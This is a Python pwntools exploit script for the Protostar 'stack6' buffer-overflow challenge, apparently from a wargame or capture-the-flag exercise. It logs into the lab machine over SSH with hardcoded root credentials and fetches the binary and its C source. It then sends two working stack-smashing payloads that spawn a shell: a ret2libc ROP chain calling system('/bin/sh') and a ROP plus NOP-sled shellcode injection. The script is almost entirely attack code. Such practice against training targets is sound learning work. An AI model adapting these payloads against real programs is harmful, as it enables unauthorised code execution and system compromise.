__author__ = '@tomereyz'
from pwn import *
import requests
from bs4 import BeautifulSoup

context.clear(arch='i386')


def option_shell_code(ssh_client, challenge_name_opt):
    """
    Option I

    Stack Based ShellCode - ROP - Nop Sled

    0xbffffc70:     0xb7e45a83      0x00000001      0xbffffd64      0xbffffd6c
    """
    e = ELF(challenge_name_opt)
    rop_gadget = ROP(e)
    rop_gadget.raw(rop_gadget.find_gadget('').address)
    nop_sled = asm('nop') * 0x200
    stack_address = 0xbffffc70 + 0x100  # Stack 0xbffffc70
    shell_code = asm(shellcraft.i386.linux.sh())

    print rop_gadget.dump()
    payload = cyclic(80) + rop_gadget.chain() + pack(stack_address, word_size=32) + nop_sled + shell_code
    r = ssh_client.process('/opt/protostar/bin/{}'.format(challenge_name_opt))
    # gdb.attach(r, '')
    # pause()
    r.sendline(payload)
    r.interactive()


def option_ret_libc(ssh_client, challenge_name_opt):
    """
    Option II
    Ret2Libc - No ASLR

    $1 = {<text variable, no debug info>} 0xb7f076f0 <read>
    $2 = {<text variable, no debug info>} 0xb7f07770 <write>

    https://libc.blukat.me/?q=read%3A0xb7f076f0%2Cwrite%3A0xb7f07770

    libc6_2.19-0ubuntu6_i386

    """
    e = ELF(challenge_name_opt)

    libc_read = 0xb7f076f0
    libc_read_offset = 0x0db6f0

    libc_base = libc_read - libc_read_offset
    libc_system_offset = 0x0403b0
    libc_sh_str = 0x1615a4

    rop_object = ROP(e)
    rop_object.call(libc_base + libc_system_offset, [libc_base + libc_sh_str])
    print rop_object.dump()
    payload = cyclic(80) + rop_object.chain()
    r = ssh_client.process('/opt/protostar/bin/{}'.format(challenge_name_opt))
    # gdb.attach(r, '')
    # pause()
    r.sendline(payload)
    r.interactive()


def main(download):
    host = 'protostar'
    passowrd = 'godmode'
    user_name = 'root'
    challenge_name = 'stack-six'
    challenge_name_opt = 'stack6'
    challenge_port = 22

    ssh_client = ssh(user=user_name, host=host, password=passowrd, port=challenge_port)
    if download:
        ssh_client.download('/opt/protostar/bin/{}'.format(challenge_name_opt))
        resp = requests.get(
            'https://exploit.education/protostar/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name_opt}.c'.format(challenge_name_opt=challenge_name_opt), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    option_ret_libc(ssh_client, challenge_name_opt)
    option_shell_code(ssh_client, challenge_name_opt)


if __name__ == '__main__':
    main(download=True)
